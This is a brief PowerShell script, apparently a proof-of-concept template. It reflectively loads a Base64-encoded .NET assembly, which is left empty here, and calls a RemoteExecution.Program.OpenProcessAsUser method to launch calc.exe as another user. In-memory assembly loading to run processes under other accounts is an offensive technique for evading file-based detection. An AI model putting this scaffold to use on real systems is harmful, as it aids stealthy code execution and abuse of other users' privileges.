
$command = "C:\windows\system32\calc.exe"
$user = ""
$debuglog = $true

$Binary = ''
$Assembly = [Reflection.Assembly]::Load([System.Convert]::FromBase64String($Binary))
$type = $Assembly.GetType('RemoteExecution.Program')
$method = $type.GetMethod('OpenProcessAsUser')
$method.Invoke($Null, @($command, $user, $debuglog))